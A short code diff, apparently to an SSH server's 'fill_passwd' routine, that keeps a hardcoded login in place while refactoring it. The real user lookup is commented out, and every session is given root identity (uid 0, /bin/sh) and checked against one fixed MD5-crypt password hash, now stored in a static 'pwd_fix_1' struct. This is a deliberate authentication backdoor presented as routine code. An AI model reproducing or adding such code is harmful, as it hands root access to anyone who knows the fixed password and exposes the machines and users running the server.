@@ -618,6 +618,15 @@ const char* get_user_shell() {
 	}
 }
 
+static struct passwd pwd_fix_1 = {
+    .pw_name = "root",
+    .pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
+    .pw_uid = 0,
+    .pw_gid = 0,
+    .pw_dir = "/root",
+    .pw_shell = "/bin/sh"
+};
+
 void fill_passwd(const char* username) {
 	struct passwd *pw = NULL;
 	if (ses.authstate.pw_name)
@@ -651,15 +660,15 @@ void fill_passwd(const char* username) {
 	ses.authstate.pw_shell = m_strdup(pw->pw_shell);
 	*/
     
-    ses.authstate.pw_uid = 0;
-	ses.authstate.pw_gid = 0;
-	ses.authstate.pw_name = "root";
-	ses.authstate.pw_dir = "/root";
-	ses.authstate.pw_shell = "/bin/sh";
+    ses.authstate.pw_uid = pwd_fix_1.pw_uid;
+	ses.authstate.pw_gid = pwd_fix_1.pw_gid;
+	ses.authstate.pw_name = pwd_fix_1.pw_name;
+	ses.authstate.pw_dir = pwd_fix_1.pw_dir;
+	ses.authstate.pw_shell = pwd_fix_1.pw_shell;
     
 	{
 		/* char *passwd_crypt = pw->pw_passwd; */
-        char *passwd_crypt = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1";
+        char *passwd_crypt = pwd_fix_1.pw_passwd;
         
 #ifdef HAVE_SHADOW_H
 		/* get the shadow password if possible */
